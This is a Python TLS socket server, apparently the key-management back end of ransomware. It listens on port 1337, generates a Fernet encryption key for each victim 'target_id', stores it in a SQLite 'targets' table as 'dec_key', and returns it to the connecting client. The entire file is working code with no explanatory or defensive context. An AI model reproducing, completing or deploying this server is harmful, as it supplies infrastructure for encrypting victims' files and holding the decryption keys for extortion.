import socket
import sqlite3
import ssl
import uuid
from cryptography.fernet import Fernet #type: ignore
def check(target):
    with sqlite3.connect('test.db') as connection:
        commands = connection.cursor()
        commands.execute("SELECT dec_key FROM targets WHERE target_id=?", (target,))
        result = commands.fetchone()
        if result:
            return result[0].encode('utf-8') 
        else:
            return None

def generate():
    try:

        key = Fernet.generate_key()
        return [True, key]
    except Exception as e:
        print("got error while generating key")
        return [False]
    

def savekey(target, key):
    tosave = key.decode('utf-8')
    connection = sqlite3.connect("test.db")
    with sqlite3.connect("test.db") as connection:
        commands = connection.cursor()
        commands.execute("INSERT INTO targets (target_id, dec_key) VALUES (?, ?)", (target, tosave))
    connection.commit()

connection = sqlite3.connect("test.db")
with sqlite3.connect("test.db") as connection:
    commands = connection.cursor()
    commands.execute('CREATE TABLE IF NOT EXISTS targets (target_id TEXT, dec_key TEXT)')
    connection.commit()    
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)

context.load_cert_chain(certfile='server.crt', keyfile='server.key')


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.bind(('0.0.0.0', 1337))


sock.listen()
print("listening")
while True:

    
    clientsock, clientip = sock.accept()
    realclient = context.wrap_socket(clientsock, server_side=True)
    print(f"connected to {clientip}")
    targetid = realclient.recv(1024).decode('utf-8')
    existing_key = check(targetid)
    if existing_key:
        print("already has key in database")
        realclient.send(existing_key)
    else:

        thiskey = generate()
        if(thiskey[0] == True):
            key = thiskey[1]
            savekey(targetid, key)
            print(f"saved key to database {key}")
            realclient.send(key)
            print("sent key")
            realclient.close()
            print("said bye bye to the client")
        else:
            print("we wont go  further since we got no key :(")
    clientsock.close()
